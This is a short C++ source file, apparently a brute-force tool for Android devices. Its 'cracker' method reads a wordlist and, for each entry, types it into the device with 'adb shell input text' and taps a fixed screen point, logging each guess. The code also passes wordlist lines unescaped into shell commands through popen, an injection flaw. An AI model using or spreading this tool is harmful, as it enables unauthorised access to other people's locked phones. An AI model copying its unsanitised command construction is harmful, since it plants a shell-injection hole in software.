#include<iostream>
#include<stdlib.h>
#include<string.h>
#include<fstream>

using namespace std;

class ADB{
public:
    string GetStdoutFromCommand(string cmd) {
      string data;
      FILE * stream;
      const int max_buffer = 256;
      char buffer[max_buffer];
      cmd.append(" 2>&1");

      stream = popen(cmd.c_str(), "r");

      if (stream) {
        while (!feof(stream))
          if (fgets(buffer, max_buffer, stream) != NULL) data.append(buffer);
        pclose(stream);
      }
      return data;
    }

    void start_adb () 
    {
        string command = GetStdoutFromCommand("adb start-server");
    }

    void cracker(string filename) {
        string i;
        fstream mf;
        mf.open(filename);

        if (mf.is_open()) {
            while (getline (mf, i)) {
                string c = "adb shell input text ";
                c.append(i);
                GetStdoutFromCommand(c.c_str());
                GetStdoutFromCommand("adb shell input tap 356 662");
                cout << "Trying: "<< i <<"\n";
            }
        }
    }

};

